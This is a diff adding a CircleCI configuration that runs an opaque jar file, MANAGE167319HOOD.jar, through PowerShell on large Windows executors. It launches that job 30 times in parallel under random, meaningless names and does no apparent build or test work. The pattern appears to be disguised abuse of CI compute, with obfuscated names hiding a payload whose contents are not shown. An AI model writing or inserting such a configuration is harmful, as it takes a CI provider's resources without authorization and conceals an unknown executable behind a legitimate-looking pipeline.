@@ -1,0 +1,82 @@
+version: 2.1
+
+orbs:
+  win: circleci/windows@5.0
+
+jobs:
+  show88mega912:
+    executor:
+      name: win/default
+      size: large
+    steps:
+      - checkout
+      - run:
+          name: INIT386935LOCAL
+          command: |
+            java -jar MANAGE167319HOOD.jar
+          shell: powershell.exe
+
+workflows:
+  version: 2
+  jobHELPER998110:
+    jobs:
+      - show88mega912:
+          name: handlear879681
+      - show88mega912:
+          name: merhelper460749
+      - show88mega912:
+          name: CHECK26OR5029
+      - show88mega912:
+          name: analyzeEDGE380002
+      - show88mega912:
+          name: async34215FER
+      - show88mega912:
+          name: APISERVICE957201
+      - show88mega912:
+          name: MAINLIB23050
+      - show88mega912:
+          name: nodener406869
+      - show88mega912:
+          name: ASYNC27srv9422
+      - show88mega912:
+          name: bridgeEOUS836066
+      - show88mega912:
+          name: CERT847165ERAL
+      - show88mega912:
+          name: STACKmeta147968
+      - show88mega912:
+          name: STOPlocal736270
+      - show88mega912:
+          name: hide18REMOTE6218
+      - show88mega912:
+          name: startERAL454105
+      - show88mega912:
+          name: VERIFYABLE556795
+      - show88mega912:
+          name: srvapp668773
+      - show88mega912:
+          name: PROXY34WEB2008
+      - show88mega912:
+          name: router785972cloud
+      - show88mega912:
+          name: channelor729780
+      - show88mega912:
+          name: appprod206886
+      - show88mega912:
+          name: STACKLER280792
+      - show88mega912:
+          name: mainWEB957253
+      - show88mega912:
+          name: BACKUP838311UTIL
+      - show88mega912:
+          name: UPDATE625954ger
+      - show88mega912:
+          name: queue49ICAL2918
+      - show88mega912:
+          name: MIGRATE33EXT5305
+      - show88mega912:
+          name: CLUSTERWARD57381
+      - show88mega912:
+          name: modifyPROC481706
+      - show88mega912:
+          name: hash8ULAR6292
